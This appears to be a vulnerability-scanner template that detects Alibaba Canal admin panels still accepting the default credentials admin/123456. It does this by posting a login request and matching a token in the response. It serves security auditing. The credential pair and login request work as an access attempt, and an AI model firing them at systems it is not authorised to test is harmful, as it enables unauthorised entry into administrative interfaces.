id: canal-default-login

info:
  name: Alibaba Canal Default Login
  author: pdteam
  severity: high
  tags: alibaba,default-login

requests:
  - raw:
      - |
        POST /api/v1/user/login HTTP/1.1
        Host: {{BaseURL}}
        Content-Type: application/json

        "username":{{username}},"password":{{password}}

    payloads:
      username:
        - admin
      password:
        - 123456
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'data":{"token"'
          - '"code":20000'
        condition: and
